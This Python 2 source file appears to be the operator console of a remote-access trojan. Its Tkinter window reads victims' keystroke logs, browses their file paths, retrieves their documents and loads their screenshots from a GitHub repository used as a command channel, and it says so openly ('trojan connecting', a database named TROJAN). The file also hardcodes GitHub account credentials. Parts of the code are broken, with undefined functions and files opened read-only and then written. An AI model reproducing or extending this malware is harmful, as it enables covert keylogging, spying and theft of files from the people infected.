# -*- coding:utf-8 -*-

"""
新
Text    文本框样例
实现功能有：Ctrl+a全选文本， 竖向滚动条，横向滚动条（不自动换行） 自动缩放

有谁知道全选文本的方法为会要 return 'break' 吗？
http://blog.csdn.net/xxb2008
"""
#from gridtest_whj import keyboard_record
from Tkinter import *
from PIL import ImageTk

import re
# import pymongo
# #import gridtest

# #文件路径处理
# client = pymongo.MongoClient('localhost', 27017)
# #从MongoDB中选择名称为 URL_LISTS 的数据库
# TROJAN= client['TROJAN']
# #从 URL_LISTS 数据库选择名称为 BLACK_LISTS 的表
# PATH = TROJAN['PATH']
# list_paths = []
global L
L=[]

def search_file(p):
    #L=[]
    global L
    paths = PATH.find({"path": re.compile(p)}).limit(10)
    # for data in PATH.aggregate(pipline):
    for data in paths:
        L.append(data['path'])
    print("+++++++++++++++++++++")
    print(L)
    return (L)
search_file("C:")
class MainFrame(Frame):
    def __init__(self, master=None):
        Frame.__init__(self, master)
        self.grid(row=0, column=0, sticky="nsew")
        self.createFrame()




    def createFrame(self):
        global mac
        global repo

        label_frame_top = LabelFrame(self)
        # label_frame_top.pack()

        label_frame_center = LabelFrame(self)
        label_frame_center.pack(fill="x")

        lfc_field_1 = LabelFrame(label_frame_center)
        lfc_field_1.pack(fill="x")


        self.lfc_field_1_l = Label(lfc_field_1, text="MAC : "+mac, width=10)
        self.lfc_field_1_l.pack(fill="x", expand=0, side=TOP)



# -----


        lfc_field_2 = LabelFrame(label_frame_center)
        lfc_field_2.pack(fill="x")

        ##########文本框与滚动条
        self.lfc_field_1_t_sv = Scrollbar(lfc_field_2, orient=VERTICAL)  # 文本框-竖向滚动条
        self.lfc_field_1_t = Text(lfc_field_2, height=15, yscrollcommand=self.lfc_field_1_t_sv.set,
                                           wrap='c')  # 设置滚动条-不换行


    # 文本清空
        def clearText():
            self.lfc_field_1_t.delete(0.0, END)
    #        file_record(repo,mac,filename)

        def freshKeyboard():
            clearText()
            if repo.contents("data/"+mac+"/keyboard.txt") == None :
            #   print "ip"
                print "dont have such file"
            con = repo.contents("data/"+mac+"/keyboard.txt")
            msg = base64.decodestring(str(con.content))
            print "ok"
            self.lfc_field_1_t.insert(1.0, msg)



        self.lfc_field_1_l = Button(lfc_field_2, text="键盘输入\n点击刷新", width=10,command=freshKeyboard)
        self.lfc_field_1_l.pack(fill="y", expand=0, side=LEFT)


        self.lfc_field_1_t.insert(1.0, keyboard_record(repo,mac))
        # 滚动事件
        self.lfc_field_1_t_sv.config(command=self.lfc_field_1_t.yview)

        # 布局
        self.lfc_field_1_t_sv.pack(fill="y", expand=0, side=RIGHT, anchor=N)
        self.lfc_field_1_t.pack(fill="x", expand=1, side=LEFT)




        # 绑定事件
        self.lfc_field_1_t.bind("<Control-Key-a>", self.selectText)
        self.lfc_field_1_t.bind("<Control-Key-A>", self.selectText)
        self.lfc_field_fresh = Button(lfc_field_2, text="刷新", width=5, height=1, command=freshKeyboard)
        ##########文本框与滚动条Tkinker.END


# ------

        lfc_field_3 = LabelFrame(label_frame_center)
        lfc_field_3.pack(fill="x")

        self.lfc_field_1_l = Label(lfc_field_3, text="查看路径", width=10)
        self.lfc_field_1_l.pack(fill="y", expand=0, side=LEFT)

        # self.lfc_field_1_b = Button(lfc_field_1, text="清除：", width=10, height=1, command=self.clearText)
        # self.lfc_field_1_b.pack(fill="none", expand=0, side=RIGHT, anchor=SE)

        ##########文本框与滚动条
        self.lfc_field_2_t_sv = Scrollbar(lfc_field_3 )  # 文本框-竖向滚动条 orient=VERTICAL


        ###文本框设置

        var = StringVar()
        var2 = StringVar()
        fl = []
        isf = [FALSE]
        self.lb = Listbox(lfc_field_3, listvariable=var, height=15, width=90)
        list_item = []
        self.lb['yscrollcommand'] = self.lfc_field_2_t_sv.set
        self.lfc_field_2_t_sv['command'] = self.lb.yview



        def print_item(event):
            var2=StringVar()
            s = self.lb.get(self.lb.curselection())
            p=s;
            if search_file(p) != 0:
                # if '\\' not in p
                # lb.delete(0, END):
                #   p += '\\'
                self.lb.delete(0,len(list_item))
                del list_item[:]
                for item in search_file(p):
                    print(item)
                    list_item.append(item)

                for item in list_item:
                    self.lb.insert(END, item)
                self.lb.bind('<ButtonRelease-1>', print_item)
            else:
                isf[0] = 1
            var2.set(p)  # 设置文本框中的值
            print list_item


        if search_file('c:') != 0:
            list_item.append('c:')
        if search_file('d:') != 0:
            list_item.append('d:')
        if search_file('e:') != 0:
            list_item.append('e:')
        if search_file('f:') != 0:
            list_item.append('f:')
        if search_file('g:') != 0:
            list_item.append('g:')

        for item in list_item:
            self.lb.insert(-1, item)

        del list_item[:]

        self.lb.bind('<ButtonRelease-1>', print_item)
        self.lb.pack(side = LEFT)


#================================

        lfc_field_4 = LabelFrame(label_frame_center)
        lfc_field_4.pack(fill="x")

        self.lfc_field_search = Text(lfc_field_4, height=1, wrap='c')  # 设置滚动条-不换行
        self.lfc_field_search.pack(fill="x", expand=0, side=LEFT)


            # fff=fff.replace("\\","\\\\")
            # print fff
            # t = threading.Thread(target=self.downloadFilesFromGit, args=(fff))
            # t.start()

        self.lfc_field_search_b = Button(lfc_field_4, text="获得文件", width=10, height=1, command=getFile)
        self.lfc_field_search_b.pack(fill="none", expand=0, side=RIGHT, anchor=SE)


# -----

        lfc_field_5 = LabelFrame(label_frame_center)
        lfc_field_5.pack(fill="x")

        self.lfc_field_1_l = Button(lfc_field_5, text="屏幕截图\n点击刷新", width=10,height=30,command=getScreen)
        self.lfc_field_1_l.pack(fill="y", expand=0, side=LEFT)

        # pic load
        def reloadPic():
            #显示上次缓存的图片
            if rep.contents("data/" + pcname + "/screen.bmp") == None:
                #   print "ip"
                print "dont have such file"
            path="data/" + pcname + "/screen.bmp"
            #print(path)
            con = rep.contents(path)
            binmsg = base64.decodestring(str(con.content))
            #保存新图片为2
            picHandle = open("C:/screen1.bmp","rb")
            picHandle.write(binmsg)
            picHandle.close()
            picHandle = open("C:/screen2.bmp","rb")
            picHandle.write(binmsg)
            picHandle.close()


        canvas = Canvas(lfc_field_5,
            width = 560,      # 指定Canvas组件的宽度
            height = 300,      # 指定Canvas组件的高度
            bg = 'white')      # 指定Canvas组件的背景色
        canvas.create_text(250,100,       # 使用create_text方法在坐标（302，77）处绘制文字
            text = '功能未开启 '      # 所绘制文字的内容
            ,fill = 'gray')
        canvas.pack(side=RIGHT)
        label_frame_bottom = LabelFrame(self)

        pass

        # 传文件
    def downloadFilesFromGit(self, filename):
        global mac

        #print repo
        #filename="keyboard.txt"

        filename=str(filename)
        #print(type(filename))
        if (repo.contents("data/" + mac + "/doc/"+filename) == None):
            #	init "mac"
            print "data/" + str(mac)  + "/doc/"+filename
            print "dont have such file... please wait for trojan connecting..."
            return "error"

        print "data/" + str(mac) +  "/doc/"+filename
        con = repo.contents("data/" + str(mac) + "/doc/" +filename)
        binstr = base64.decodestring(str(con.content))
        print len(binstr)
        print binstr
        filename = filename.split('\\')[-1]

        fileHandle = open("C:\\temp\\"+filename, 'wb')
        fileHandle.write(binstr)
        fileHandle.close()
        #	rep.update_file("data/"+str(m)+"/doc/doc.txt", "upload dir", searchFileDir(), sha)
        print "download ok"
        # 文本全选

    def selectText(self, event):
        self.lfc_field_1_t.tag_add(SEL, "1.0", END)
        # self.lfc_field_1_t.mark_set(INSERT, "1.0")
        # self.lfc_field_1_t.see(INSERT)
        return 'break'  # 为什么要return 'break'

    # 文本清空
    def clearText(self):
        self.lfc_field_1_t.delete(0.0, END)
#        file_record(repo,mac,filename)


def run(s,r):
    global mac
    global repo
    mac=r
    repo=s
    print(mac)
    root = Tk()
    root.columnconfigure(0, weight=1)
    root.rowconfigure(0, weight=1)
    root.geometry('640x640')  # 设置了主窗口的初始大小960x540 800x450 640x360

    main_frame = MainFrame(root)

    main_frame.mainloop()
import base64

def keyboard_record(rep, pcname):
    #print("rep:=====================")
    #print(rep)
    if rep.contents("data/" + pcname + "/keyboard.txt") == None:
        #	print "ip"
        print "dont have such file"
    path="data/" + pcname + "/keyboard.txt"
    #print(path)
    con = rep.contents(path)
    msg = base64.decodestring(str(con.content))
    return msg


from github3 import *
import wmi
# 登录到github
def connect_to_github():
    gh = login(username="OXVyeah", password="heiya233")
    #print(gh)
    repo = gh.repository("OXVyeah", "TROyeah")
    #print(repo)
    branch = repo.branch("master")

    return gh, repo, branch

# 获得mac地址
def network():
    c = wmi.WMI()
    for interface in c.Win32_NetworkAdapterConfiguration (IPEnabled=1):
        print "MAC: %s" % interface.MACAddress
        return str(interface.MACAddress).replace(":","-")


# g,r,b=connect_to_github()
# s=network()
# run(r,s)

